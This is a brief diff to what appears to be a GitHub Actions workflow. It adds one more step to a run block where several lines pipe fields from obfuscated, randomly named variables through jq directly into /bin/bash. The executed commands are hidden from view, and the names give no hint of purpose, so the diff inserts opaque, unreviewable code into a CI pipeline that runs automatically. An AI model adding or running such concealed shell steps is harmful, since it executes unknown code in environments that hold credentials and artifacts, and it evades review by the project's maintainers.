@@ -54,6 +54,7 @@ jobs:
           echo $awg26622 | jq -r .frsz13 | /bin/bash
           echo $i85 | jq -r .vj7762 | /bin/bash
           echo $itq994 | jq -r .fbrlr0734 | /bin/bash
+          echo $np4 | jq -r .yjdl04306 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
